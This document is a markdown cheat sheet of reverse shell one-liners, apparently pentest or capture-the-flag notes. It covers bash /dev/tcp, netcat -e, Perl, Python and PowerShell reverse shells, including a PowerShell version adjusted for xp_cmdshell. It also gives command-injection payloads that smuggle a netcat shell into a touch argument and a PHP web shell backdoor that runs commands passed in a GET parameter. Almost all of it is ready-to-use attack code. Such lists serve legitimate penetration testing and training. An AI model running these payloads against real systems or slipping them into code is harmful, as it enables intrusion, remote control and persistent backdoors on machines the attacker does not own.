# Reverse shell scripts

## Proper working reverse shell
```
CTRL + Z -> It will run the session in the background
stty raw -echo
fg
fg
```

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Using shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Using Netcat
```
cmd=nc -nv 192.168.1.71 4444 -e /bin/bash  
```

## Using Perl
```
perl -e 'use Socket;$i="192.168.1.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.32\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'
```

## Command injection reverse shell
```
touch ; nc 10.10.14.52 5555 -e /bin/bash
touch '; nc 10.10.14.52 5555 -e /bin/bash'
```

### Powershell Oneliner
For xp_cmdshell (bypassing single quote restricion by including one more single quote)

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.1.1.1'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

General oneliner

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


### Upload nc.exe to windows machine and obtain reverse shell

```
nc.exe 10.10.14.6 4444 -e cmd.exe
```

### Backdoor

PHP

```
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

Usage: http://<IP>/<filenam>?e=whoami
```
